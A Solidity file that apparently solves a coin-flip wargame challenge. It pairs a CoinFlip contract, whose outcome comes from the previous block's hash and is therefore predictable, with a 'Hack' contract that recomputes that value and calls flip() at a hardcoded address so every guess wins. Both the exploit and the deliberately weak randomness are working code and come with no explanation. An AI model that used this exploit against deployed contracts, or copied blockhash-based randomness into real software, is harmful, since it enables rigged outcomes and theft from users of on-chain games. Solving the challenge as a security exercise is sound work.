//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract CoinFlip {
    using SafeMath for uint256;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() public {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }

    function setBlockValue() public {
        uint256 currentBlockValue = uint256(blockhash(block.number.sub(1)));

        if (currentBlockValue.div(FACTOR) == 0) {}
    }

    function blockValue() public view returns (uint256) {
        return uint256(blockhash(block.number.sub(1)));
    }

    function checkDiv() public view returns (uint256) {
        return blockValue().div(FACTOR);
    }
}

contract Hack {
    using SafeMath for uint256;

    CoinFlip private _coinFlip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        _coinFlip = CoinFlip(0xB3187357206B63425cbE2a850E628354e4Ce0Ca0);
    }

    function setGuess() public {
        uint256 currentBlockValue = uint256(blockhash(block.number.sub(1)));
        _coinFlip.flip(currentBlockValue.div(FACTOR) == 1);
    }
}
